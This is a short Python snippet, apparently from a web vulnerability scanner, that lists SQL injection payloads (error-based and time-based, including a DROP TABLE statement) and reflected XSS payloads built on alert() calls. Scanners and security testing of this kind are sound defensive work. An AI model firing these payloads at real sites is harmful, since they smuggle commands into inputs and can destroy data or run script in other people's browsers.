# SQL Injection payloads (error-based, time-based)
SQLI_PAYLOADS = [
    ("'", "error"),
    ("' OR '1'='1", "error"),
    ("' OR 1=1--", "error"),
    ("'; DROP TABLE users--", "error"),
    ("' OR SLEEP(5)--", "time"),
    ("' AND SLEEP(5)--", "time"),
    ("1' AND '1'='1", "error"),
    ("1' AND '1'='2", "error"),
]

# XSS payloads (reflected)
XSS_PAYLOADS = [
    ("<script>alert('XSS')</script>", "alert"),
    ("<img src=x onerror=alert('XSS')>", "alert"),
    ("<svg onload=alert('XSS')>", "alert"),
    ("javascript:alert('XSS')", "alert"),
    ("<body onload=alert('XSS')>", "alert"),
    ("<input type='text' value='XSS'>", "injection"),
]
